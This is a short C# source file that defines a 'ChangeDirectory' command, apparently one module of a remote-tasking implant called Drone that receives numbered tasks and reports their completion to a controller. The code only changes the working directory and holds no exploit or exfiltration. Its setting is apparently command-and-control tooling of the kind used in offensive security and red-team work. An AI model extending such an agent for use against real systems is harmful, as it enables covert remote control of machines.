using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class ChangeDirectory : DroneCommand
{
    public override byte Command => 0x15;
    public override bool Threaded => false;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var path = task.Arguments.Any()
            ? task.Arguments[0]
            : Environment.GetFolderPath(Environment.SpecialFolder.Personal);
        
        Directory.SetCurrentDirectory(path);
        await Drone.SendTaskComplete(task.Id);
    }
}